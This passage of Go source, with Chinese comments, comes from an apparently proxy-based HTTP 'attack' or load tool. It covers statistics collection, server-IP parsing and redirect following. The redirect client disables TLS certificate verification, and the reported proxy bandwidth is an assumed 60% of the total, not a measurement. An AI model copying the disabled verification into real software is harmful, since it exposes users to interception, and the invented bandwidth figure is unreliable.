			statsMap["proxyReqOK"] = a.stats.Success
			statsMap["proxyReqFail"] = a.stats.Failed

			// 代理带宽计算为总带宽
			if bandwidth, ok := statsMap["bandwidth"]; ok {
				if bw, ok := bandwidth.(float64); ok {
					statsMap["proxyBandwidth"] = bw
				}
			}
		}
	} else {
		statsMap["proxyCount"] = int(0)
		statsMap["proxyReqOK"] = int64(0)
		statsMap["proxyReqFail"] = int64(0)
		statsMap["proxyBandwidth"] = float64(0)
	}

	// 调试输出代理统计信息
	if a.opts.Debug {
		fmt.Printf("[DEBUG] Proxy Stats: Count=%v, Success=%v, Failed=%v\n",
			statsMap["proxyCount"], statsMap["proxyReqOK"], statsMap["proxyReqFail"])
	}

	// 添加最近请求信息
	a.recentRequestsMutex.RLock()

	// 确保有请求历史
	if len(a.recentRequests) > 0 {
		// 当前请求是队列中最新的请求
		lastReqData := a.recentRequests[0]

		// 添加到统计数据中
		statsMap["lastRequest"] = lastReqData

		// 如果有多个请求，添加请求历史列表
		if len(a.recentRequests) > 1 {
			statsMap["recentRequests"] = a.recentRequests
		}

		// 输出调试信息
		if a.opts.Debug {
			fmt.Printf("[DEBUG] GetStats返回的lastRequest - URL: %s, ID: %v\n",
				lastReqData["url"], lastReqData["id"])
			fmt.Printf("[DEBUG] 当前请求历史队列长度: %d\n", len(a.recentRequests))
		}
	} else if a.lastRequest != nil {
		// 兼容旧逻辑，如果没有历史队列但有lastRequest
		// 输出调试信息
		if a.opts.Debug {
			fmt.Printf("[DEBUG] GetStats处理lastRequest - URL: %s\n", a.lastRequest.URL)
		}

		proxyInfo := "direct"
		if a.lastProxyUsed != "" {
			proxyInfo = a.lastProxyUsed
		}

		serverInfo := "unknown"
		serverIP := "unknown"
		if a.lastResponse != nil && a.lastResponse.Header != nil {
			// 尝试获取服务器信息
			if server := a.lastResponse.Header.Get("Server"); server != "" {
				serverInfo = server
			}

			// 尝试获取服务器IP
			// 首先尝试从X-Forwarded-For获取
			if a.lastResponseIP != "" {
				serverIP = a.lastResponseIP
			} else {
				// 尝试从其他头获取信息
				if ip := a.lastResponse.Header.Get("X-Real-IP"); ip != "" {
					serverIP = ip
				} else if serverAddr := a.lastResponse.Header.Get("X-Server-Addr"); serverAddr != "" {
					serverIP = serverAddr
				}

				// 尝试从Request的RemoteAddr获取
				if serverIP == "unknown" && a.lastResponse.Request != nil && a.lastResponse.Request.RemoteAddr != "" {
					if host, _, err := net.SplitHostPort(a.lastResponse.Request.RemoteAddr); err == nil {
						serverIP = host
					}
				}

				// 如果都没有，尝试从URL解析主机名并尝试获取IP
				if serverIP == "unknown" && a.lastRequest != nil {
					if parsedURL, err := url.Parse(a.lastRequest.URL); err == nil {
						host := parsedURL.Hostname()
						// 尝试将域名解析为IP
						if ips, err := net.LookupIP(host); err == nil && len(ips) > 0 {
							// 优先使用IPv4地址
							for _, ip := range ips {
								if ipv4 := ip.To4(); ipv4 != nil {
									serverIP = ipv4.String()
									break
								}
							}
							// 如果没有找到IPv4，使用第一个IP
							if serverIP == "unknown" && len(ips) > 0 {
								serverIP = ips[0].String()
							}
						} else {
							// 如果解析失败，至少使用域名
							serverIP = host
						}
					}
				}
			}
		}

		// 每次为lastRequest生成一个新的随机ID以确保UI更新
		reqID := fmt.Sprintf("%d", time.Now().UnixNano())

		// 创建lastRequest数据
		lastReqData := map[string]interface{}{
			"proxy":   proxyInfo,
			"url":     a.lastRequest.URL, // 使用最新的请求URL
			"code":    a.lastStatusCode,
			"latency": a.lastLatency,
			"size":    a.lastResponseSize,
			"server":  serverInfo,
			"ip":      serverIP,
			"id":      reqID, // 添加随机ID确保UI总是更新
		}

		// 将lastRequest添加到统计数据中
		statsMap["lastRequest"] = lastReqData

		// 输出调试信息
		if a.opts.Debug {
			fmt.Printf("[DEBUG] GetStats返回的lastRequest - URL: %s, ID: %s\n",
				lastReqData["url"], lastReqData["id"])
		}
	}

	a.recentRequestsMutex.RUnlock()

	return statsMap
}

// GetRawStats returns the raw attack statistics struct
func (a *AttackImpl) GetRawStats() *Stats {
	a.statsMutex.RLock()
	defer a.statsMutex.RUnlock()

	if a.stats == nil {
		// 如果stats为nil，创建一个新的带有默认值的stats对象
		return &Stats{
			Start:               time.Now(),
			Codes:               make(map[int]int64),
			Errors:              make(map[string]int),
			LatencyDistribution: make(map[int64]int64),
			Total:               0,
			Success:             0,
			Failed:              0,
		}
	}

	return a.stats
}

// ToMap 将Statistics结构体转换为map，用于Dashboard消费
func (s *Stats) ToMap() map[string]interface{} {
	s.Mu.Lock()
	defer s.Mu.Unlock()

	// Calculate average response time
	avgResponseTime := 0.0
	if s.Total > 0 {
		avgResponseTime = float64(s.TotalLatency) / float64(s.Total)
	}

	// 计算网络相关指标
	elapsed := time.Now().Sub(s.Start).Seconds()
	totalBytes := float64(s.BytesReceived + s.BytesSent)

	// 如果带宽为0或不存在，重新计算带宽 (Mbps)
	bandwidth := s.Bandwidth
	if bandwidth == 0 && elapsed > 0 {
		bandwidth = (totalBytes * 8.0) / (elapsed * 1024.0 * 1024.0) // Mbps
	}

	// 如果总流量为0，重新计算总流量 (GB)
	totalTraffic := s.TotalTraffic
	if totalTraffic == 0 {
		totalTraffic = totalBytes / (1024.0 * 1024.0 * 1024.0) // GB
	}

	// 计算代理带宽（假设代理带宽是总带宽的60%）
	proxyBandwidth := bandwidth * 0.6

	// 计算上传和下载速度
	uploadRatio := float64(s.BytesSent) / totalBytes
	if math.IsNaN(uploadRatio) {
		uploadRatio = 0.5 // 默认上传下载各占50%
	}
	uploadSpeed := bandwidth * uploadRatio
	downloadSpeed := bandwidth * (1 - uploadRatio)

	return map[string]interface{}{
		"total":          s.Total,
		"success":        s.Success,
		"failed":         s.Failed,
		"avgRt":          avgResponseTime,
		"bytesIn":        s.BytesReceived,
		"bytesOut":       s.BytesSent,
		"totalLatency":   s.TotalLatency,
		"minLatency":     s.MinLatency,
		"maxLatency":     s.MaxLatency,
		"rps":            s.CurrentRPS,
		"requestRate":    s.RequestRate,
		"byteRate":       s.ByteRate,
		"bandwidth":      bandwidth,      // Mbps
		"totalTraffic":   totalTraffic,   // GB
		"proxyBandwidth": proxyBandwidth, // Mbps
		"uploadSpeed":    uploadSpeed,    // Mbps
		"downloadSpeed":  downloadSpeed,  // Mbps
		"codes":          s.Codes,
		"errTypes":       s.Errors,
		"latencyDist":    s.LatencyDistribution,
		"cpuUsage":       s.CPUUsage,
		"memUsage":       s.MemUsage,
		"gcUsage":        s.GCUsage,
	}
}

// parseResponseIP 解析响应IP
func (a *AttackImpl) parseResponseIP(resp *http.Response) {
	if resp != nil && resp.Header != nil {
		// 尝试从X-Forwarded-For获取IP
		if xForwardedFor := resp.Header.Get("X-Forwarded-For"); xForwardedFor != "" {
			a.lastResponseIP = xForwardedFor
		} else {
			// 尝试从其他头获取信息
			if ip := resp.Header.Get("X-Real-IP"); ip != "" {
				a.lastResponseIP = ip
			} else if serverAddr := resp.Header.Get("X-Server-Addr"); serverAddr != "" {
				a.lastResponseIP = serverAddr
			}

			// 尝试从Request的RemoteAddr获取
			if a.lastResponseIP == "" || a.lastResponseIP == "unknown" {
				if resp.Request != nil && resp.Request.RemoteAddr != "" {
					if host, _, err := net.SplitHostPort(resp.Request.RemoteAddr); err == nil {
						a.lastResponseIP = host
					}
				}
			}

			// 如果还是没有获取到IP，尝试从URL解析主机名
			if a.lastResponseIP == "" || a.lastResponseIP == "unknown" {
				if resp.Request != nil && resp.Request.URL != nil {
					host := resp.Request.URL.Hostname()
					// 尝试将域名解析为IP
					if ips, err := net.LookupIP(host); err == nil && len(ips) > 0 {
						// 优先使用IPv4地址
						for _, ip := range ips {
							if ipv4 := ip.To4(); ipv4 != nil {
								a.lastResponseIP = ipv4.String()
								break
							}
						}
						// 如果没有找到IPv4，使用第一个IP
						if a.lastResponseIP == "" || a.lastResponseIP == "unknown" {
							if len(ips) > 0 {
								a.lastResponseIP = ips[0].String()
							}
						}
					} else {
						// 如果解析失败，至少使用域名
						a.lastResponseIP = host
					}
				}
			}
		}
	}
}

// 检查是否为重定向状态码
func isRedirectStatus(statusCode int) bool {
	return statusCode == 301 || statusCode == 302 || statusCode == 307 || statusCode == 308
}

// 处理重定向请求
func (a *AttackImpl) handleRedirect(resp *http.Response, originalReq httplib.Request, currentProxy string) (*http.Response, error) {
	// 首先检查上下文是否已取消
	if a.ctx.Err() != nil {
		return nil, a.ctx.Err()
	}

	maxRedirects := 10
	currentResp := resp
	var finalResp *http.Response

	// 保存所有需要关闭的响应体，便于在出错时关闭
	var responsesToClose []*http.Response
	defer func() {
		// 关闭所有中间响应，除了最终返回的响应
		for _, r := range responsesToClose {
			if r != nil && r != finalResp {
				r.Body.Close()
			}
		}
	}()

	// 添加原始响应到历史记录中
	redirectCount := 0

	for redirectCount < maxRedirects {
		// 每次重定向前检查上下文是否取消
		if a.ctx.Err() != nil {
			return nil, a.ctx.Err()
		}

		// 检查是否是重定向状态码
		if !isRedirectStatus(currentResp.StatusCode) {
			// 不是重定向，结束循环
			break
		}

		// 记录这个响应需要被关闭
		responsesToClose = append(responsesToClose, currentResp)

		// 获取重定向URL
		location := currentResp.Header.Get("Location")
		if location == "" {
			return nil, fmt.Errorf("redirect status %d but no Location header", currentResp.StatusCode)
		}

		if a.opts.Debug {
			fmt.Printf("[DEBUG] 重定向至: %s\n", location)
		}

		// 解析重定向URL
		redirectURL, err := url.Parse(location)
		if err != nil {
			return nil, fmt.Errorf("failed to parse redirect URL: %w", err)
		}

		// 如果是相对URL，需要与当前响应的URL合并
		if !redirectURL.IsAbs() {
			baseURL, _ := url.Parse(currentResp.Request.URL.String())
			redirectURL = baseURL.ResolveReference(redirectURL)
		}

		// 创建新的请求
		redirectReq := httplib.Request{
			Method:  "GET", // 重定向通常使用GET
			URL:     redirectURL.String(),
			Headers: make(map[string]string),
		}

		// 复制原始请求的头部（除了特定头部）
		for key, value := range originalReq.Headers {
			if key != "Host" && key != "Connection" && key != "Content-Length" {
				redirectReq.Headers[key] = value
			}
		}

		// 从原响应复制Cookie
		cookies := currentResp.Cookies()
		if len(cookies) > 0 {
			cookieStr := ""
			for _, cookie := range cookies {
				if cookieStr != "" {
					cookieStr += "; "
				}
				cookieStr += cookie.Name + "=" + cookie.Value
			}
			if cookieStr != "" {
				redirectReq.Headers["Cookie"] = cookieStr
			}
		}

		// 使用一个新的HTTP客户端进行重定向请求，避免连接重用问题
		// 这是一个重要的改变，防止原始客户端的连接池问题
		redirectClient, err := httplib.NewClient(httplib.ClientOptions{
			Timeout:    a.client.Timeout,
			KeepAlive:  false, // 不保持连接
			ForceHTTP2: false,
			MaxConns:   10,
			SkipVerify: true,
			Debug:      a.opts.Debug,
		})

		if err != nil {
			return nil, fmt.Errorf("failed to create redirect client: %w", err)
		}

		// 记录重定向请求到历史记录中，使用同一个ID但添加注释
		reqID := time.Now().UnixNano()
		a.recentRequestsMutex.Lock()
		redirectInfo := map[string]interface{}{
			"proxy":     currentProxy,
			"url":       redirectURL.String(),
			"method":    "GET",
			"status":    0, // 暂时未知
			"latency":   0, // 暂时未知
			"size":      0, // 暂时未知
			"server":    "",
			"ip":        "",
			"id":        reqID,
			"note":      fmt.Sprintf("重定向自 %s", originalReq.URL),
			"timestamp": time.Now().Format("15:04:05"),
		}
		a.recentRequests = append(a.recentRequests, redirectInfo)
		// 如果队列超过10个，移除最早的
		if len(a.recentRequests) > 10 {
			a.recentRequests = a.recentRequests[1:]
		}
		a.recentRequestsMutex.Unlock()

		// 发送重定向请求
		start := time.Now()
		redirectResp, err := redirectClient.Do(a.ctx, redirectReq)
		if err != nil {
			return nil, fmt.Errorf("failed to follow redirect: %w", err)
		}
		duration := time.Since(start)

		// 提取服务器信息
		server := redirectResp.Header.Get("Server")

		// 提取IP信息
		ip := ""
		if redirectResp.Request != nil && redirectResp.Request.URL != nil {
			host := redirectResp.Request.URL.Hostname()
			ips, err := net.LookupIP(host)
			if err == nil && len(ips) > 0 {
				ip = ips[0].String()
			}
		}

		// 更新重定向请求信息
		a.recentRequestsMutex.Lock()
		for i, req := range a.recentRequests {
			if req["id"] == reqID {
				a.recentRequests[i]["status"] = redirectResp.StatusCode
				a.recentRequests[i]["latency"] = duration.Milliseconds()
				a.recentRequests[i]["size"] = redirectResp.ContentLength
				a.recentRequests[i]["server"] = server
				a.recentRequests[i]["ip"] = ip
				break
			}
		}
		a.recentRequestsMutex.Unlock()

		// 如果这个响应不是重定向，就停止循环
		if !isRedirectStatus(redirectResp.StatusCode) {
			currentResp = redirectResp
			break
		}

		// 继续处理下一个重定向
		currentResp = redirectResp
		redirectCount++
	}

	// 如果达到了最大重定向次数，返回错误
	if redirectCount >= maxRedirects {
		return nil, fmt.Errorf("too many redirects (maximum: %d)", maxRedirects)
	}

	// 设置最终响应
	finalResp = currentResp
	return finalResp, nil
}
